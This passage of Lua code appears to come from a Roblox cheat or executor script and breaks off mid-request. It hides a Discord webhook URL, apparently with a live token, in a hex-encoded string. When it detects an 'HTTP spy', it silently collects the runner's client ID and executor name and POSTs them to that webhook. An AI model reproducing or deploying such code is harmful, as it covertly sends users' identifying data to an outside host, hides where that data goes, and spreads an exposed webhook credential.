            if not req then return end
            local alertHook = _0xH("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
            local hw = "N/A"
            pcall(function() hw = _RAS:GetClientId() end)
            local exec = "Unknown"
            pcall(function() if identifyexecutor then exec = identifyexecutor() end end)
            req({
                Url = alertHook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = _H:JSONEncode({
                    embeds = {{
                        title = "🚨 HTTP SPY DETECTED 🚨",
                        color = 16711680,
